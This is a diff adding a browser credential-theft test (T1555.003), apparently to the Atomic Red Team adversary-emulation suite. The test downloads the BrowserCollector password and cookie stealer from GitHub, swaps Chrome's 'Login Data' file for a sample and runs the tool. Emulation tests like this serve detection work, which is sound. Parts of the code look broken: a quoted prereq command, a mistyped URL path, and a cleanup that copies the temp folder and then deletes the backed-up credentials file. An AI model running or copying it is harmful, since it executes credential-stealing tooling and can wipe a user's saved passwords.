@@ -412,3 +412,45 @@ atomic_tests:
       Stop-Process -Name "WebBrowserPassView"
     name: powershell
     elevation_required: true 
+- name: BrowserStealer (Chrome / Firefox / Microsoft Edge)
+  description: |
+    [Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line.
+    If using to test with Firefox, if the browser is x64 you need to use the x64 build
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Google Chrome must be on the device.
+    prereq_command: |
+      'if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe") -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")) {exit 0} else {exit 1}'
+    get_prereq_command: |
+      $installer = "$env:temp\ChromeStandaloneSetup64.msi"
+      Invoke-WebRequest -OutFile $env:temp\ChromeStandaloneSetup64.msi https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
+      msiexec /i $installer /qn
+      Start-Process -FilePath "chrome.exe"
+      Stop-Process -Name "chrome"
+  - description: |
+      BrowserCollector must exist in the bin directory
+    prereq_command: |
+      if (Test-Path "PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe") {exit 0} else {exit 1}
+    get_prereq_command: |-
+      Invoke-WebRequest "https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe" -Outfile: "PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe"
+  - description: |
+      Login Data file that is a copy of a chrome Login Data that contains credentials for the tool to "steal." Must exist at the specified path.
+    prereq_command: |-
+      if (Test-Path "PathToAtomicsFolder\T1555.003\src\Login Data") {exit 0} else {exit 1}
+    get_prereq_command: |-
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T155.003/src/LoginData?raw=true" -Outfile: "PathToAtomicsFolder\T1555.003\src\Login Data"
+  executor:
+    command: |
+      Copy-Item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" -Destination "$env:temp" > $null
+      Remove-Item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" > $null
+      Copy-Item "$env:PathToAtomicsFolder\T1555.003\src\Login Data" -Destination "$env:localappdata\Google\Chrome\User Data\Default\" > $null
+      cd "$env:PathToAtomicsFolder\T1555.003\bin"
+      .\BrowserCollector.exe
+    cleanup_command: |
+      Remove-Item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" > $null
+      Copy-Item "$env:temp" -Destination "$env:localappdata\Google\Chrome\User Data\Default\Login Data" > $null
+      Remove-Item "$env:temp\Login Data" > $null
+    name: powershell
